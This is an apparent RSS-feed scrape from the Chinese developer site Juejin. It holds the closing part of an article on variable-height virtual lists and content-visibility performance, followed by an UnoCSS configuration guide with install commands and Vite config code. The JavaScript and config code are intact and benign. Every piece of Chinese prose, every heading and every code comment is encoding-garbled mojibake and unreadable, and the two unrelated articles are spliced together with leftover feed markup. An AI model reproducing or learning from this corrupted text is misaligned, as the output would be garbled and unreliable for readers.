<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3313cceb88f8488c8fcb68f0f5678b27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=nJCbzHDb6Rkw%2BP2PJd9zNTXJKXs%3D" alt="image.png" loading="lazy"/>
ä½¿ç”¨äº†content-visibilityä¼˜åŒ–çš„é•¿åˆ—è¡¨Renderingè€—æ—¶1528msï¼ŒPaintingè€—æ—¶122msã€‚å¯ä»¥çœ‹åˆ°ç«Ÿç„¶å˜æˆäº†åå‘ä¼˜åŒ–ï¼Œæ¸²æŸ“æ—¶é—´åè€Œå¢åŠ ã€‚</p>
<blockquote>
<p>æ€è€ƒ2ï¼šä¸ºä»€ä¹ˆcontent-visibilityå½¢æˆäº†åå‘ä¼˜åŒ–ï¼Ÿ</p>
</blockquote>
<h2 data-id="heading-19">äº”ã€æ€è€ƒå¤ç›˜</h2>
<h3 data-id="heading-20">1.ä¸ç­‰é«˜çš„åˆ—è¡¨é¡¹å¦‚ä½•ä½¿ç”¨è™šæ‹Ÿé˜Ÿåˆ—ï¼Ÿ</h3>
<h4 data-id="heading-21">ï¼ˆ1ï¼‰ä¸ºæ¯ä¸ªåˆ—è¡¨é¡¹è®¾ç½®ä¸€ä¸ªé¢„ä¼°é«˜åº¦</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//æ ¹æ®å†…å®¹é¢„ä¼°åˆ—è¡¨é¡¹é«˜åº¦</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">estimateHeight</span>(<span class="hljs-params">item</span>) {
    <span class="hljs-keyword">const</span> contentLines = item.<span class="hljs-property">content</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">" "</span>).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span> + contentLines * <span class="hljs-number">20</span>;
}
</code></pre>
<h4 data-id="heading-22">ï¼ˆ2ï¼‰åŸºäºé¢„ä¼°é«˜åº¦æ„å»ºä¸€ä¸ªä½ç½®æ˜ å°„æ•°ç»„ï¼Œè®°å½•æ¯ä¸ªé¡¹çš„èµ·å§‹ä½ç½®å’Œé«˜åº¦</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//åŸºäºé¢„ä¼°é«˜åº¦æ„å»ºä½ç½®æ˜ å°„æ•°ç»„</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initPositions</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> currentOffsetTop = <span class="hljs-number">0</span>;
    data.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> height = <span class="hljs-title function_">estimateHeight</span>(item);
        positions.<span class="hljs-title function_">push</span>({
            index,<span class="hljs-comment">//ä¸‹æ ‡</span>
            <span class="hljs-attr">offsetTop</span>: currentOffsetTop,<span class="hljs-comment">//é¢„ä¼°åç§»é«˜åº¦</span>
            height,<span class="hljs-comment">//é¢„ä¼°é«˜åº¦</span>
            <span class="hljs-attr">isMeasured</span>: <span class="hljs-literal">false</span>,<span class="hljs-comment">//å®é™…é«˜åº¦æ˜¯å¦è¢«æµ‹é‡</span>
        });
        currentOffsetTop += height;
    });
    placeholder.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${currentOffsetTop}</span>px`</span>;
}
</code></pre>
<h4 data-id="heading-23">ï¼ˆ3ï¼‰æ ¹æ®å½“å‰æ»šåŠ¨ä½ç½®å’Œå®¹å™¨é«˜åº¦ï¼Œé€šè¿‡äºŒåˆ†æŸ¥æ‰¾å¿«é€Ÿå®šä½éœ€è¦æ¸²æŸ“çš„èµ·å§‹é¡¹</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//äºŒåˆ†æŸ¥æ‰¾èµ·å§‹é¡¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">findFirstVisibleIndex</span>(<span class="hljs-params">scrollTop</span>) {
    <span class="hljs-keyword">let</span> low = <span class="hljs-number">0</span>,high = positions.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (low &lt;= high) {
        <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((low + high) / <span class="hljs-number">2</span>);
        <span class="hljs-keyword">if</span> (positions[mid].<span class="hljs-property">offsetTop</span> &lt;= scrollTop) {
            index = mid;
            low = mid + <span class="hljs-number">1</span>;
        }<span class="hljs-keyword">else</span>{
            high = mid - <span class="hljs-number">1</span>;
        }
    }
    <span class="hljs-keyword">return</span> index;
}
</code></pre>
<h4 data-id="heading-24">ï¼ˆ4ï¼‰æ¸²æŸ“å¯è§†åŒºåŸŸå†…çš„é¡¹</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//æ¸²æŸ“å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderVisibleData</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">//è·å–æ»šåŠ¨é«˜åº¦å’Œè§†å£é«˜åº¦</span>
    <span class="hljs-keyword">const</span> { scrollTop, clientHeight } = container;
    <span class="hljs-keyword">const</span> visibleStart = scrollTop;
    <span class="hljs-keyword">const</span> visibleEnd = scrollTop + clientHeight;
    <span class="hljs-comment">//è·å–èµ·å§‹ä¸‹æ ‡</span>
    <span class="hljs-keyword">let</span> startIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
        <span class="hljs-number">0</span>,
        <span class="hljs-title function_">findFirstVisibleIndex</span>(visibleStart) - <span class="hljs-variable constant_">BUFFER_SIZE</span>
    );
    <span class="hljs-comment">//è·å–ç»ˆæ­¢ä¸‹æ ‡</span>
    <span class="hljs-keyword">let</span> endIndex = startIndex;
    <span class="hljs-keyword">while</span> (
        endIndex &lt; data.<span class="hljs-property">length</span> &amp;&amp;
        positions[endIndex].<span class="hljs-property">offsetTop</span> &lt; visibleEnd
    ) {
        endIndex++;
    }
    endIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(data.<span class="hljs-property">length</span>, endIndex + <span class="hljs-variable constant_">BUFFER_SIZE</span>);
    <span class="hljs-comment">//æˆªå–åˆ—è¡¨é¡¹</span>
    <span class="hljs-keyword">const</span> visibleData = data.<span class="hljs-title function_">slice</span>(startIndex, endIndex);
    <span class="hljs-comment">//æ’å…¥DOM</span>
    <span class="hljs-keyword">let</span> html = <span class="hljs-string">""</span>;
    visibleData.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, idx</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> realIndex = startIndex + idx;
        <span class="hljs-keyword">const</span> position = positions[realIndex];
        html += <span class="hljs-string">`
            &lt;div 
            class="virtual-item" 
            style="top: <span class="hljs-subst">${position.offsetTop}</span>px; height: <span class="hljs-subst">${position.height}</span>px;"
            data-index="<span class="hljs-subst">${realIndex}</span>"
            &gt;
                &lt;strong&gt;<span class="hljs-subst">${item.title}</span>&lt;/strong&gt;
                &lt;div&gt;<span class="hljs-subst">${item.content}</span>&lt;/div&gt;
                &lt;small&gt;é¢„ä¼°é«˜åº¦: <span class="hljs-subst">${estimateHeight(item)}</span>px | 
                <span class="hljs-subst">${
                position.isMeasured
                ? <span class="hljs-string">`çœŸå®é«˜åº¦: <span class="hljs-subst">${position.height}</span>px`</span>
                : <span class="hljs-string">"æœªæµ‹é‡"</span>
                }</span>&lt;/small&gt;
            &lt;/div&gt;
        `</span>;
    });
    visibleArea.<span class="hljs-property">innerHTML</span> = html;
    visibleArea.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">"none"</span>;
}
</code></pre>
<h4 data-id="heading-25">ï¼ˆ5ï¼‰æ¸²æŸ“åï¼Œç«‹å³æµ‹é‡è¿™äº›é¡¹çš„çœŸå®é«˜åº¦ï¼Œå°†æµ‹é‡åˆ°çš„çœŸå®é«˜åº¦ä¸é¢„ä¼°é«˜åº¦è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå­˜åœ¨å·®å¼‚ï¼Œæ›´æ–°ä½ç½®æ˜ å°„æ•°ç»„</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//æµ‹é‡çœŸå®é«˜åº¦</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">measureAndUpdatePositions</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">//åˆå§‹åŒ–å˜é‡</span>
    <span class="hljs-keyword">const</span> renderedItems = visibleArea.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">".virtual-item"</span>);
    <span class="hljs-keyword">let</span> hasHeightChanged = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">let</span> totalHeightDiff = <span class="hljs-number">0</span>; 
    <span class="hljs-comment">//éå†æ¸²æŸ“çš„æ¯ä¸€ä¸ªDOMè·å–çœŸå®é«˜åº¦</span>
    renderedItems.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> index = <span class="hljs-built_in">parseInt</span>(element.<span class="hljs-property">dataset</span>.<span class="hljs-property">index</span>);
        <span class="hljs-keyword">const</span> position = positions[index];
        <span class="hljs-keyword">if</span> (position.<span class="hljs-property">isMeasured</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">const</span> realHeight = element.<span class="hljs-property">offsetHeight</span>;
        <span class="hljs-comment">//å¤„ç†å·®å¼‚</span>
        <span class="hljs-keyword">if</span> (realHeight !== position.<span class="hljs-property">height</span>) {
            <span class="hljs-comment">//æ›´æ–°ä½ç½®æ˜ å°„æ•°ç»„é«˜åº¦</span>
            hasHeightChanged = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">const</span> heightDiff = realHeight - position.<span class="hljs-property">height</span>;
            position.<span class="hljs-property">height</span> = realHeight;
            position.<span class="hljs-property">isMeasured</span> = <span class="hljs-literal">true</span>;
            <span class="hljs-comment">//è®¡ç®—ç‰¹æ®Šæƒ…å†µé€ æˆçš„æ»šåŠ¨æ¡ä½ç½®å·®å€¼</span>
            <span class="hljs-keyword">if</span> (position.<span class="hljs-property">offsetTop</span> + heightDiff &lt; container.<span class="hljs-property">scrollTop</span>) {
                totalHeightDiff += heightDiff;
            }
            <span class="hljs-comment">//æ›´æ–°ä½ç½®æ˜ å°„æ•°ç»„åç§»é«˜åº¦</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = index + <span class="hljs-number">1</span>; i &lt; positions.<span class="hljs-property">length</span>; i++) {
                positions[i].<span class="hljs-property">offsetTop</span> += heightDiff;
            }
        }
    });
    <span class="hljs-comment">//æ›´æ–°å®¹å™¨æ€»é«˜åº¦</span>
    <span class="hljs-keyword">if</span> (hasHeightChanged) {
    <span class="hljs-keyword">const</span> totalHeight =
    positions[positions.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">offsetTop</span> +
    positions[positions.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">height</span>;
    placeholder.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${totalHeight}</span>px`</span>;
    <span class="hljs-comment">//æ›´æ–°æ»šåŠ¨æ¡ä½ç½®</span>
    <span class="hljs-keyword">if</span> (totalHeightDiff !== <span class="hljs-number">0</span>) {
    container.<span class="hljs-property">scrollTop</span> += totalHeightDiff;
    }
    <span class="hljs-comment">//æ¸²æŸ“DOM</span>
    <span class="hljs-title function_">renderVisibleData</span>();
    }
}
</code></pre>
<h3 data-id="heading-26">2.ä¸ºä»€ä¹ˆcontent-visibilityå½¢æˆäº†åå‘ä¼˜åŒ–ï¼Ÿ</h3>
<p>å¯¹äºæœ¬èº«æ¸²æŸ“æˆæœ¬ä½çš„å…ƒç´ ï¼ˆå¦‚ç®€å•æ–‡æœ¬ã€å°å›¾æ ‡ï¼‰ï¼Œæ·»åŠ content-visibility: autoå¯èƒ½ä¸ä¼šæå‡æ€§èƒ½ï¼Œåè€Œä¼šå¢åŠ æµè§ˆå™¨çš„å¯è§æ€§åˆ¤æ–­æˆæœ¬ã€‚æ¥ä¸‹æ¥æ¯”è¾ƒåŒ…å«å›¾ç‰‡å’Œå¤æ‚æ ·å¼çš„åˆ—è¡¨é¡¹ã€‚</p>
<h4 data-id="heading-27">ï¼ˆ1ï¼‰å¤æ‚é•¿åˆ—è¡¨</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b67d13fefe3468595cd37f55bd06f0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=42F%2BtZ5pr%2BaRe5CbAL2dGR%2Bjlis%3D" alt="image.png" loading="lazy"/>
æœªè¿›è¡Œä¼˜åŒ–çš„å¤æ‚é•¿åˆ—è¡¨Renderingè€—æ—¶1100msï¼ŒPaintingè€—æ—¶150msã€‚</p>
<h4 data-id="heading-28">ï¼ˆ2ï¼‰å¤æ‚è™šæ‹Ÿåˆ—è¡¨</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bfb1eb2709f4e4682f42a8161a420e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=2q9qpBf1TlWXSQXwkaHa6vJiQFY%3D" alt="image.png" loading="lazy"/>
ä½¿ç”¨è™šæ‹Ÿåˆ—è¡¨ä¼˜åŒ–çš„å¤æ‚é•¿åˆ—è¡¨Renderingè€—æ—¶4msï¼ŒPaintingè€—æ—¶1msã€‚</p>
<h4 data-id="heading-29">ï¼ˆ3ï¼‰ä½¿ç”¨äº†content-visibilityä¼˜åŒ–çš„å¤æ‚é•¿åˆ—è¡¨</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb3c8f18489644659083b95be9cc941d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449105&amp;x-signature=mo1hZ0g4674JY6ScdyMddKTWAcY%3D" alt="image.png" loading="lazy"/>
ä½¿ç”¨äº†content-visibilityä¼˜åŒ–çš„å¤æ‚é•¿åˆ—è¡¨Renderingè€—æ—¶64msï¼ŒPaintingè€—æ—¶16msã€‚<br/>
åœ¨è¿™æ¬¡å¤æ‚é•¿åˆ—è¡¨çš„ä¼˜åŒ–ä¸­ï¼Œèƒ½å¤Ÿçœ‹å‡ºcontent-visibilityä¼˜åŒ–çš„æ•ˆæœã€‚<br/>
<br/>
<strong>æ„Ÿè°¢è§‚çœ‹ï¼æ¬¢è¿å„ä½å¤§ä½¬æŒ‡æ­£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UnoCssæœ€æ–°é…ç½®æ”»ç•¥]]></title>    <link>https://juejin.cn/post/7592550891539496979</link>    <guid>https://juejin.cn/post/7592550891539496979</guid>    <pubDate>2026-01-08T05:33:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592550891539496979" data-draft-id="7592572266753179711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UnoCssæœ€æ–°é…ç½®æ”»ç•¥"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T05:33:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€ªå¯çˆ±çš„åœ°çƒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/4387527339288932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UnoCssæœ€æ–°é…ç½®æ”»ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4387527339288932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€ªå¯çˆ±çš„åœ°çƒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:33:29.000Z" title="Thu Jan 08 2026 05:33:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 data-id="heading-0">å®‰è£…å‘½ä»¤</h5>
<pre><code class="hljs language-js" lang="js"># å®‰è£… <span class="hljs-title class_">UnoCSS</span>
npm install -D unocss

# å¦‚æœä½¿ç”¨ <span class="hljs-title class_">Vue</span> <span class="hljs-number">3</span>ï¼Œè¿˜éœ€è¦å®‰è£…é¢„è®¾
npm install -D @unocss/preset-uno @unocss/preset-attributify @unocss/preset-icons
</code></pre>
<h5 data-id="heading-1">é…ç½®æ­¥éª¤</h5>
<p>1.åˆ›å»ºuno.config.tsæ–‡ä»¶ï¼ˆé¡¹ç›®æ ¹ç›®å½•ï¼‰</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>
<span class="hljs-keyword">import</span> presetUno <span class="hljs-keyword">from</span> <span class="hljs-string">'@unocss/preset-uno'</span>
<span class="hljs-keyword">import</span> presetAttributify <span class="hljs-keyword">from</span> <span class="hljs-string">'@unocss/preset-attributify'</span>
<span class="hljs-keyword">import</span> presetIcons <span class="hljs-keyword">from</span> <span class="hljs-string">'@unocss/preset-icons'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">presets</span>: [
    <span class="hljs-title function_">presetUno</span>(),
    <span class="hljs-title function_">presetAttributify</span>(),
    <span class="hljs-title function_">presetIcons</span>({
      <span class="hljs-attr">collections</span>: {
        <span class="hljs-comment">// å¯ä»¥é…ç½®å›¾æ ‡é›†åˆ</span>
      }
    })
  ],
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
})
</code></pre>
<p>2.ä¿®æ”¹vite.config.ts</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UnoCSS</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss/vite'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title class_">UnoCSS</span>()  <span class="hljs-comment">// æ·»åŠ  UnoCSS æ’ä»¶</span>
  ],
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./src'</span>)
    }
  }
})
</code></pre>
<h5 data-id="heading-2">3.åœ¨main.tsä¸­å¼•å…¥æ ·å¼</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:uno.css'</span>
</code></pre>
<h5 data-id="heading-3">4.åœ¨index.htmlæˆ–è€…style.cssä¸­æ·»åŠ </h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/* æˆ–è€…ç›´æ¥åœ¨ style.css ä¸­ */</span>
@<span class="hljs-keyword">import</span> <span class="hljs-string">'uno.css'</span>;
</code></pre>
<h2 data-id="heading-4">æœ€æ–°ç”¨æ³•å’Œæ–‡æ¡£</h2>
<h3 data-id="heading-5">å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Funocss.dev%2F" target="_blank" title="https://unocss.dev/" ref="nofollow noopener noreferrer">unocss.dev/</a></p>
</li>
<li>
<p>ä¸­æ–‡æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Funocss.dev%2Finteractive%2F" target="_blank" title="https://unocss.dev/interactive/" ref="nofollow noopener noreferrer">unocss.dev/interactiveâ€¦</a></p>
</li>
<li>
<p>GitHubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funocss%2Funocss" target="_blank" title="https://github.com/unocss/unocss" ref="nofollow noopener noreferrer">github.com/unocss/unocâ€¦</a></p>
</li>
</ul>
<h2 data-id="heading-6">æ ¸å¿ƒç‰¹æ€§</h2>
<ol>
<li>åŸå­åŒ– CSSï¼šæŒ‰éœ€ç”Ÿæˆï¼Œä½“ç§¯å°</li>
<li>å³æ—¶ç¼–è¯‘ï¼šå¼€å‘æ—¶å³æ—¶ç”Ÿæˆæ ·å¼</li>
<li>é¢„è®¾ç³»ç»Ÿï¼šæ”¯æŒå¤šä¸ªé¢„è®¾ç»„åˆ</li>
<li>å›¾æ ‡æ”¯æŒï¼šå†…ç½®å›¾æ ‡é¢„è®¾</li>
</ol>
<h3 data-id="heading-7">å¸¸ç”¨é¢„è®¾</h3>
<ul>
<li>
<p>@unocss/preset-unoï¼šé»˜è®¤é¢„è®¾ï¼ˆTailwind å…¼å®¹ï¼‰</p>
</li>
<li>
<p>@unocss/preset-attributifyï¼šå±æ€§åŒ–æ¨¡å¼</p>
</li>
<li>
<p>@unocss/preset-iconsï¼šå›¾æ ‡æ”¯æŒ</p>
</li>
<li>
<p>@unocss/preset-typographyï¼šæ’ç‰ˆé¢„è®¾</p>
</li>
<li>
<p>@unocss/preset-web-fontsï¼šWeb å­—ä½“</p>
</li>
</ul>
<h6 data-id="heading-8">ä½¿ç”¨ç¤ºä¾‹</h6>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  &lt;!-- åŸå­åŒ–ç±»å --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center justify-center p-4 bg-blue-500 text-white"</span>&gt;</span>
    Hello UnoCSS
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  
  &lt;!-- å±æ€§åŒ–æ¨¡å¼ --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">flex</span> <span class="hljs-attr">items-center</span> <span class="hljs-attr">p</span>=<span class="hljs-string">"4"</span> <span class="hljs-attr">bg</span>=<span class="hljs-string">"blue-500"</span> <span class="hljs-attr">text</span>=<span class="hljs-string">"white"</span>&gt;</span>
    Hello UnoCSS
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  
  &lt;!-- å›¾æ ‡ --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"i-carbon-sun"</span> /&gt;</span></span>
&lt;/template&gt;
</code></pre>
<h6 data-id="heading-9">æµç¨‹</h6>
